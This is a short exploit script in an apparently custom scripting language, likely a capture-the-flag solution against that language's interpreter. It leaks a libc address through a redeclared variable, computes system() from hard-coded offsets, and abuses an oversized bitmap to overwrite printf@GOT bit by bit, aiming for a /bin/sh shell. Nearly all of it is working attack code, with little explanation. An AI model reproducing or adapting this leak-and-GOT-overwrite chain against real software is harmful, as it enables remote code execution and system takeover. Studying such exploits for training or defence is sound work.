print("=== Full RCE Exploit ===");

print("Step 1: Leak libc address");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc address (setvbuf):");
print(leaked);

print("Step 2: Calculate system address");
print("libc_base = leaked - 0x88550");
print("system_addr = libc_base + 0x58750");
print("system_addr = 137050643072848");

print("Step 3: Create bitmap for arbitrary write");
bitmap b1 = create(9223372036854775807, 2);

print("Step 4: Write system_addr to printf@GOT");
print("printf@GOT = 0x409048 (4202568)");
print("Trying bitmap_data_ptr = 0x400000 (binary base)");
print("offset = 0x9048, bit_index = 295488");

int gotaddr = 4202568;
int bitmapptr = 4194304;
int offset = gotaddr - bitmapptr;
int bitindex = offset * 8;

print("Writing 64 bits...");
set(b1, 295488, 0, 0);
set(b1, 295489, 0, 0);
set(b1, 295490, 0, 0);
set(b1, 295491, 0, 0);
set(b1, 295492, 0, 1);
set(b1, 295493, 0, 0);
set(b1, 295494, 0, 1);
set(b1, 295495, 0, 0);
set(b1, 295496, 0, 1);
set(b1, 295497, 0, 1);
set(b1, 295498, 0, 1);
set(b1, 295499, 0, 0);
set(b1, 295500, 0, 0);
set(b1, 295501, 0, 0);
set(b1, 295502, 0, 0);
set(b1, 295503, 0, 1);
set(b1, 295504, 0, 1);
set(b1, 295505, 0, 0);
set(b1, 295506, 0, 1);
set(b1, 295507, 0, 0);
set(b1, 295508, 0, 0);
set(b1, 295509, 0, 1);
set(b1, 295510, 0, 1);
set(b1, 295511, 0, 1);
set(b1, 295512, 0, 0);
set(b1, 295513, 0, 1);
set(b1, 295514, 0, 1);
set(b1, 295515, 0, 0);
set(b1, 295516, 0, 1);
set(b1, 295517, 0, 0);
set(b1, 295518, 0, 0);
set(b1, 295519, 0, 1);
set(b1, 295520, 0, 1);
set(b1, 295521, 0, 0);
set(b1, 295522, 0, 1);
set(b1, 295523, 0, 0);
set(b1, 295524, 0, 0);
set(b1, 295525, 0, 1);
set(b1, 295526, 0, 0);
set(b1, 295527, 0, 1);
set(b1, 295528, 0, 0);
set(b1, 295529, 0, 0);
set(b1, 295530, 0, 1);
set(b1, 295531, 0, 1);
set(b1, 295532, 0, 1);
set(b1, 295533, 0, 1);
set(b1, 295534, 0, 1);
set(b1, 295535, 0, 0);
set(b1, 295536, 0, 0);
set(b1, 295537, 0, 0);
set(b1, 295538, 0, 0);
set(b1, 295539, 0, 0);
set(b1, 295540, 0, 0);
set(b1, 295541, 0, 0);
set(b1, 295542, 0, 0);
set(b1, 295543, 0, 0);
set(b1, 295544, 0, 0);
set(b1, 295545, 0, 0);
set(b1, 295546, 0, 0);
set(b1, 295547, 0, 0);
set(b1, 295548, 0, 0);
set(b1, 295549, 0, 0);
set(b1, 295550, 0, 0);
set(b1, 295551, 0, 0);

print("Write completed");

print("Step 5: Trigger shell");
print("print with /bin/sh");
print("This should call system and give shell");

